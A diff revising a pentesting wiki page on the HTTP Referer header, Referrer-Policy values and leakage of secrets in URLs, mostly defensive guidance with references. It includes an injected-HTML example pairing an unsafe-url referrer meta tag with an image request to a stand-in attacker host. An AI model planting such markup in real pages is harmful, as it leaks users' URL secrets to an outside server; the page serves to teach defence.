@@ -1,20 +1,20 @@
-# Interesting HTTP
+# Interesting HTTP Behavior
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Referrer headers and policy
+## `Referer` Header and Referrer Policy
 
-Referrer is the header used by browsers to indicate which was the previous page visited.
+The HTTP `Referer` request header identifies the absolute or partial URL from which a resource was requested. Depending on the active referrer policy, it can include the referring origin, path, and query string, but not the URL fragment.<sup>[[1]](#references)</sup>
 
-### Sensitive information leaked
+### Sensitive Information Leakage
 
-If at some point inside a web page any sensitive information is located on a GET request parameters, if the page contains links to external sources or an attacker is able to make/suggest (social engineering) the user visit a URL controlled by the attacker. It could be able to exfiltrate the sensitive information inside the latest GET request.
+Secrets in URL paths or query parameters can leak through browser history, logs, analytics, copied links, and the `Referer` header. A cross-origin link or subresource request may therefore disclose the referring URL to an external server.<sup>[[2]](#references)</sup>
 
 ### Mitigation
 
-You can make the browser follow a **Referrer-policy** that could **avoid** the sensitive information to be sent to other web applications:
+Use the `Referrer-Policy` response header to control how much referrer information the browser sends. `strict-origin-when-cross-origin` is the modern default in browsers, while `no-referrer` suppresses the header entirely; choose the policy that matches the application's requirements.<sup>[[3]](#references)</sup>
 
-```
+```http
 Referrer-Policy: no-referrer
 Referrer-Policy: no-referrer-when-downgrade
 Referrer-Policy: origin
@@ -25,17 +25,24 @@ Referrer-Policy: strict-origin-when-cross-origin
 Referrer-Policy: unsafe-url
 ```
 
-### Counter-Mitigation
+Do not place passwords, session identifiers, API keys, or other sensitive values in URLs. Send them in appropriate request headers or bodies over TLS instead.<sup>[[2]](#references)</sup>
 
-You can override this rule using an HTML meta tag (the attacker needs to exploit and HTML injection):
+### HTML Injection Consideration
+
+A document can also set a page-wide policy with `<meta name="referrer">`. If an HTML injection flaw lets an attacker insert an effective meta element, the attacker may attempt to weaken the document's policy for subsequent requests. Dynamically injected or conflicting meta policies can behave unpredictably, so verify the behavior in the target browser rather than assuming that the response header is always overridden.<sup>[[4]](#references)</sup>
 
 ```html
 <meta name="referrer" content="unsafe-url">
-<img src="https://attacker.com">
+<img src="https://attacker.example/collect" alt="">
 ```
 
-## Defense
+Fix the underlying HTML injection and keep sensitive data out of the URL; a referrer policy is defense in depth, not a substitute for either control.
 
-Never put any sensitive data inside GET parameters or paths in the URL.
+## References
+
+- [1] [MDN - `Referer` header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referer)
+- [2] [MITRE CWE-598 - Use of GET Request Method With Sensitive Query Strings](https://cwe.mitre.org/data/definitions/598.html)
+- [3] [MDN - `Referrer-Policy` header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referrer-Policy)
+- [4] [MDN - `<meta name="referrer">`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/meta/name/referrer)
 
 {{#include ../banners/hacktricks-training.md}}
